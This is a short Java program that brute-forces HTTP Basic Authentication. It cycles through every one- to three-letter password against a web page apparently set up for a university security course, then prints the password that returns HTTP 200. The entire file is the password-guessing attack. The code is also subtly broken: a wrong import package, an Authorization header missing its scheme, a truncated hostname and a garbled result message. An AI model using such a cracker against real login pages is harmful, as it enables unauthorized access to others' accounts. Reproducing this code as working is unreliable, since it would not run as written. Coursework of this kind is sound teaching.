import java.io.*;
import java.net.*;
import java.misc.*;

public class BruteForce
{
   private static char increment(char pw)
   {
      if(pw=='Z')
      {
         return 'a';
      }
      else if(pw=='z')
      {
         return 'A';
      }
      else
      {
         return (char) (pw+1);
      }
   }

   public static void main (String args[]) throws IOException
   {

      final int maxLength = 3;
      final String username = "";
      final URL pageURL = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");


      String password="";
      char passwd[];
      BASE64Encoder encoder = new BASE64Encoder();
      boolean notFound = true;
      HttpURLConnection conn;

      for(int pwl=1;pwl<=maxLength&&notFound;pwl++)
      {
         passwd = new char[pwl];
         for(int init=0;init<pwl;init++)
         {
            passwd[init]='A';
         }

         for(int i=0;i<Math.pow(52,pwl);i++)
         {
            password=new String(passwd);
            conn = (HttpURLConnection) pageURL.openConnection();
            conn.setRequestProperty("Authorization", " "+encoder.encode((username+":"+password).getBytes()));
            if((conn.getResponseCode())==HttpURLConnection.HTTP_OK)
            {
               notFound=false;
               break;
            }

            for(int j=pwl-1;j>=0;j--)
            {
               if((passwd[j]=increment(passwd[j]))!='A')
               {
                  break;
               }
            }
         }
      }

      if(notFound)
      {
         System.out.println(" valid password found.");
      }
      else
      {
         System.out.println("Found valid password: \""+password+"\"");
      }

   }
}

